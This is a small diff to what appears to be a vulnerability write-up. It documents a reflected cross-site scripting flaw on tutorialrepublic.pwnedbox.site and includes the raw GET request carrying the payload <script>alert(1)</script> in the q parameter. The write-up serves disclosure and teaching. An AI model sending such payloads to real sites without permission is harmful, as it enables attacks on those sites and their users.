@@ -28,7 +28,7 @@ Step 2: Modify the q parameter to contain the following payload: <script>alert(1
 
 <img width="746" height="254" alt="image" src="https://github.com/user-attachments/assets/96272a18-7cc5-424c-921c-7f0d9e6a56fe" />
 
-GET /?q=<script>alert(1)</script> HTTP/1.1
+GET /?q=<script>alert(1)</script> HTTP/1.1  
 Host: tutorialrepublic.pwnedbox.site
 
 The payload is returned unsanitized in the response and executed by the browser, displaying an alert popup.
